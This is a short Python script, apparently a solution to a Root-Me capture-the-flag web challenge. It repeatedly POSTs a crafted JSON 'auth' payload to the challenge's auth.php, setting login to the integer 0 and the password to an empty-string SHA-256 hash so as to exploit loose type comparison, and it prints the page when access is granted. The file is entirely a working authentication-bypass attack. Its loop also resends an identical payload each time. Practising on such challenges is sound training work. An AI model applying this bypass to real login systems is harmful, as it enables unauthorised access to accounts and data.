#!/usr/bin/env python3

import requests as r
import urllib.parse

url = 'http://challenge01.root-me.org/web-serveur/ch44/auth.php'


for i in range(0,10000000):
	data = {
		'auth': '{"data":{"login":0,"password":"e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855"}}'
		}
	req = r.post(url,data=urllib.parse.quote(str(data)))
	print(len(req.text),urllib.parse.quote(str(data)))
	if 'Access granted' in req.text:
		print(req.text) 
	

